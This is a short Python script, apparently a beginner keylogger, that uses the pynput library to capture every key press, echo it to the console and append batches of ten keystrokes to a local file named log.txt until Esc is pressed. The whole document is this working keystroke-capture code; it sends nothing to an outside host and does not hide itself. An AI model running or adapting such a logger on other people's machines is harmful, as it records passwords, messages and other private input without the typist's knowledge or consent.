from pynput import keyboard

count=0
keys=[]

def write_file(keys):
    with open("log.txt","a") as f:
        for i in keys:
            i=str(i).replace("'","")
            i=str(i).replace("Key.space"," ")
            i=str(i).replace("Key.enter","\n")
            f.write(str(i))

def on_press(key):
    global keys,count

    keys.append(key)
    count+=1

    print(" {0} pressed".format(key))

    if count == 10:
        count=0
        write_file(keys)
        keys=[]

def on_release(key):
    if key== keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
